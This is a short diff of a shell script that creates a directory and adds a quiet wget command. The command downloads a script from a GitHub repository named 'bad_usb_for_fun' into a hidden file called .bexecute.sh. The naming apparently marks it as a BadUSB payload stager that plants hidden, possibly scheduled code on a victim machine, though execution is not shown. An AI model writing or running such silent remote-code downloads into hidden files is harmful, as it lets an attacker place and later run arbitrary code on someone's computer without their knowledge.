@@ -5,7 +5,7 @@ bexecute_file="$bnodes_dir/.bexecute.sh"
 buninstall_file="$bnodes_dir/.buninstall.sh"
 
 [ ! -d "$bnodes_dir" ] && mkdir -p "$bnodes_dir"
-wget -q -O "$bexecute_file" ""
+wget -q -O "$bexecute_file" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/chronjobs/soundstage/bexecute.sh"
 wget -q -O "$buninstall_file" ""
 
 
